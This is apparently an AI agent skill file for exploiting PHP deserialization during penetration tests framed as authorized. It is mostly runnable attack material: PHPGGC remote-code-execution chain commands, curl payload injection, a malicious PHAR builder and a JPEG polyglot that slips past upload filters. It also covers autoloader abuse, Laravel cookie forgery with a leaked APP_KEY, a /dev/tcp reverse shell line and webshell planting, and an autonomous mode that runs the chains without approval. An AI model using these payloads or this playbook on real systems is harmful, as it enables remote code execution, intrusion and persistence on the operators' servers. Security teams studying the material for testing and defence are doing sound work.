---
name: deserialization-php
description: >
  Exploit PHP deserialization vulnerabilities during authorized penetration
  testing.
keywords:
  - php deserialization
  - php object injection
  - unserialize exploit
  - __wakeup exploit
  - __destruct exploit
  - phar deserialization
  - phar polyglot
  - PHPGGC
  - Laravel deserialization
  - PHP POP chain
  - php magic methods exploit
  - type juggling auth bypass
tools:
  - phpggc
  - burpsuite
  - exiftool
opsec: medium
---

# PHP Deserialization

You are helping a penetration tester exploit PHP deserialization
vulnerabilities. The target application passes untrusted data to
`unserialize()` or processes attacker-controlled phar:// streams, enabling
object injection and remote code execution via gadget chains. All testing is
under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Auto-detect serialization format and framework. Test PHPGGC
  chains systematically. Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (injection
  confirmed, gadget chain identified, RCE achieved, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] deserialization-php → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `deser-php-pop-chain.txt`, `deser-php-phar-rce.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[deserialization-php] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] deserialization-php → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- A PHP deserialization endpoint (`unserialize()` on user input, or filesystem
  function accepting `phar://`)
- Tools: `phpggc` (`git clone https://github.com/ambionics/phpggc`),
  Burp Suite for request interception
- Knowledge of target framework/libraries (Laravel, Symfony, WordPress, etc.)

## Step 1: Assess

If not already provided, determine:

1. **Serialization format** — look for these patterns:

| Pattern | Meaning | Example |
|---------|---------|---------|
| `O:<len>:"<class>"` | Serialized object | `O:8:"stdClass":1:{s:1:"a";s:1:"b";}` |
| `a:<count>:{...}` | Serialized array | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` |
| `s:<len>:"<value>"` | Serialized string | `s:5:"hello";` |
| `Tz` (base64) | Base64-encoded serialized | Decode to check for `O:` or `a:` |

2. **Entry point**:
   - GET/POST parameters
   - Cookies (session data, auth tokens)
   - HTTP headers
   - File uploads (phar:// trigger)
   - Database-stored serialized data

3. **Framework** — check for Laravel, Symfony, WordPress, Magento, CakePHP,
   Yii, CodeIgniter (determines available PHPGGC chains)

4. **PHP version** — PHP 7.0+ supports `allowed_classes` option in
   `unserialize()`, PHP 7.4+ has `__serialize()`/`__unserialize()`

Skip if context was already provided.

## Step 2: Basic Object Injection

### Direct Injection (Custom Application)

If the application has vulnerable classes with exploitable magic methods:

```php
# Magic methods triggered during deserialization:
# __wakeup()    — called when object is unserialized
# __destruct()  — called when object is garbage collected (most reliable)
# __toString()  — called when object is cast to string
# __call()      — called when undefined method is invoked
# __get()       — called when undefined property is read
```

**Test payload** — modify object properties:

```
# Original serialized session (example)
O:4:"User":2:{s:4:"name";s:5:"guest";s:5:"admin";b:0;}

# Modified — set admin=true
O:4:"User":2:{s:4:"name";s:5:"guest";s:5:"admin";b:1;}
```

### Type Juggling via Deserialization

Exploit loose comparison (`==`) in PHP:

```
# If auth check uses: if ($data['password'] == $storedPassword)
# Send boolean true — true == "any_string" is true in PHP
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}

# Magic hash collision (md5/sha1 starting with 0e — treated as 0 in ==)
# md5('240610708') starts with 0e → 0e... == 0e... is true
```

### Private/Protected Property Injection

PHP serialization encodes visibility with null bytes:

```
# Public property
s:4:"name";s:5:"value";

# Protected property (prefix: \0*\0)
s:7:"\0*\0name";s:5:"value";

# Private property (prefix: \0ClassName\0)
s:14:"\0MyClass\0name";s:5:"value";
```

## Step 3: PHPGGC (Framework Gadget Chains)

PHPGGC generates POP chains for common PHP frameworks and libraries.

```bash
# List all available gadget chains
phpggc --list

# Common RCE chains
phpggc Monolog/RCE1 system id                    # Monolog logging
phpggc Monolog/RCE2 system id                    # Monolog alternative
phpggc Laravel/RCE9 system id                    # Laravel framework
phpggc Laravel/RCE13 system id                   # Laravel alternative
phpggc Symfony/RCE4 system id                    # Symfony framework
phpggc SwiftMailer/FW1 /var/www/html/shell.php /tmp/data  # File write

# Output formats
phpggc Monolog/RCE1 system id -s                 # Serialized string
phpggc Monolog/RCE1 system id -b                 # Base64 encoded
phpggc Monolog/RCE1 system id -u                 # URL encoded
phpggc Monolog/RCE1 system id -p phar -o /tmp/exploit.phar  # PHAR format

# Inject into parameter
curl -X POST https://TARGET/endpoint \
  -d "data=$(phpggc Monolog/RCE1 system 'id' -u)"
```

**Framework → chain selection:**

| Framework/Library | Chains | Notes |
|-------------------|--------|-------|
| Laravel | RCE9, RCE13, RCE15 | Requires APP_KEY for encrypted cookies |
| Symfony | RCE4+ | Common in Symfony-based apps |
| Monolog | RCE1, RCE2 | Widely used logging library |
| Guzzle | FW1, Info1 | HTTP client — file write chains |
| SwiftMailer | FW1-4 | Email library — file write |
| Doctrine | RCE1-2 | ORM — RCE chains |
| WordPress | Various | Plugin-dependent gadgets |
| CakePHP | RCE1 | Framework-specific |
| Yii | RCE1 | Framework-specific |

### Laravel with Known APP_KEY

If the Laravel APP_KEY is known (from `.env` disclosure, git leak, debug
page, etc.), encrypted cookies can be forged:

```bash
# Generate gadget chain
phpggc Laravel/RCE13 system 'id' -b -f

# Encrypt with laravel-crypto-killer
python3 laravel_crypto_killer.py encrypt \
  -k "base64:APP_KEY_HERE" \
  -v "$(phpggc Laravel/RCE13 system id -b -f)"

# Inject as Laravel session cookie or XSRF-TOKEN
```

**APP_KEY leak sources:** `.env` via path traversal, debug error pages
(`APP_DEBUG=true`), git repository exposure, backup files, phpinfo().

## Step 4: Phar Deserialization

When PHP filesystem functions process a `phar://` path, the PHAR metadata
is automatically deserialized — even with functions like `file_exists()`,
`filesize()`, `fopen()`, `is_file()`, `md5_file()`, `file_get_contents()`.

### Create Malicious PHAR

```php
<?php
// create_phar.php — run with: php --define phar.readonly=0 create_phar.php

class VULN_CLASS {  // Replace with target's vulnerable class
    public $cmd = 'system("id");';
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new VULN_CLASS());
$phar->stopBuffering();
?>
```

### PHAR Polyglot (Bypass Upload Filters)

Prepend image magic bytes to make the PHAR appear as a valid image:

```php
<?php
// JPEG polyglot — passes image validation, works as PHAR
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");  // JPEG header
$phar->setMetadata(new VULN_CLASS());
$phar->stopBuffering();
// Rename to .jpg for upload
rename('exploit.phar', 'exploit.jpg');
?>
```

Other magic byte options: `GIF89a` (GIF), `\x89PNG\r\n\x1a\n` (PNG).

### PHAR + PHPGGC

```bash
# Generate PHAR with framework gadget chain
phpggc Monolog/RCE1 system id -p phar -o exploit.phar

# Create JPEG polyglot PHAR with PHPGGC
phpggc Monolog/RCE1 system id -p phar -pp GIF -o exploit.gif
```

### Exploitation Flow

1. Upload PHAR polyglot as image (passes extension/MIME checks)
2. Trigger deserialization via any filesystem function that accepts
   user-controlled path:
   ```
   # If app has: file_exists($_GET['file'])
   curl "https://TARGET/check?file=phar:///var/www/uploads/exploit.jpg"

   # If app has: getimagesize($_GET['url'])
   curl "https://TARGET/resize?url=phar:///var/www/uploads/exploit.jpg"
   ```

## Step 5: Autoload Exploitation

When the target has `spl_autoload_register()` and you can deserialize
objects of non-existent classes, the autoloader attempts to load them —
potentially including arbitrary files.

```php
// If autoloader converts underscores to directory separators:
// spl_autoload_register(function($name) {
//     require '/' . str_replace('_', '/', $name) . '.php';
// });

// Payload to load /tmp/evil.php via autoloader:
O:8:"tmp_evil":0:{}

// Load another webapp's composer autoloader (gains access to its gadgets):
O:28:"www_frontend_vendor_autoload":0:{}
```

**Chain technique**: Load another app's autoloader via deserialization,
then exploit gadgets from that app's dependencies (e.g., Guzzle
FileCookieJar for file write).

## Step 6: Escalate or Pivot

### Reverse Shell via MCP

When RCE is confirmed, **prefer catching a reverse shell via the MCP
shell-server** over continuing to craft serialized payloads for each command.

1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
2. Send a reverse shell payload via the deserialization vector:
   ```bash
   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
   ```
3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
4. Use `send_command()` for all subsequent commands

If the target lacks outbound connectivity, continue with inline command
execution and note the limitation in state.md.

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **RCE achieved**: Establish reverse shell, route to privilege escalation
- **File write only (no direct RCE)**: Write webshell to web root, then
  access it; or write `.htaccess` to enable PHP execution in upload dir
- **Auth bypass only**: Explore admin functionality, look for additional
  injection points
- **Found credentials/keys**: Route to database access or lateral movement
- **Can upload phar but no trigger**: Route to **lfi** to find a filesystem
  function that accepts `phar://`
- **Found file upload + deserialization**: Combine phar polyglot upload
  with **file-upload-bypass** techniques

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: confirmed technique, framework/version, current
mode, and any payloads that already succeeded.

## Stall Detection

If you have spent **5 or more tool-calling rounds** troubleshooting the same
failure with no meaningful progress — same error, no new information gained,
no change in output — **stop**.

Retrying a command with adjusted syntax, different flags, or additional context
counts as progress. Stalling means repeating the same approach and getting the
same result.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing changes the outcome after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)
- Update `engagement/state.md` Blocked section before returning

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Update state.md Blocked section, return findings to the
  orchestrator. Do not retry the same technique — the orchestrator will
  decide whether to revisit with new context or route elsewhere.

## OPSEC Notes

- Serialized payloads visible in web server access logs
- PHAR files persist on disk — clean up after testing
- PHPGGC chains contain distinctive class names (Monolog, Guzzle) that may
  trigger application-level logging
- Failed deserialization attempts often generate PHP warnings/errors —
  check if error logging exposes testing activity
- Laravel encrypted cookies hide payload content but cookie size may be
  anomalous

## Troubleshooting

### PHPGGC Chain Throws Error

- Confirm the target framework/library version matches the chain requirements
- Try multiple chains for the same framework (`Laravel/RCE9`, `RCE13`, `RCE15`)
- Check if `unserialize()` uses `allowed_classes` restriction (PHP 7.0+)
- If `allowed_classes` is set, only whitelisted classes instantiate — try
  phar:// deserialization instead (bypasses `allowed_classes`)

### Phar Deserialization Not Triggering

- Verify the filesystem function accepts user-controlled input
- Check if `phar://` wrapper is disabled in `php.ini`
  (`allow_url_fopen` does not affect phar)
- Ensure the PHAR file is accessible at the path you're referencing
- Try `phar://` with relative and absolute paths
- Some functions require the phar to have a valid signature

### Serialized Data Modified but No Effect

- Check if the application validates a MAC/signature on the serialized data
- Laravel encrypts + HMACs cookies — need APP_KEY to forge
- WordPress uses `wp_salt()` for cookie signatures
- Try finding the signing key or look for unsigned deserialization points

### Type Juggling Bypass Not Working

- PHP 8.0+ changed `==` behavior for string-number comparison (`"0" == ""`
  is now false)
- Check if the application uses strict comparison (`===`)
- Magic hash collisions only work with loose `==` comparison
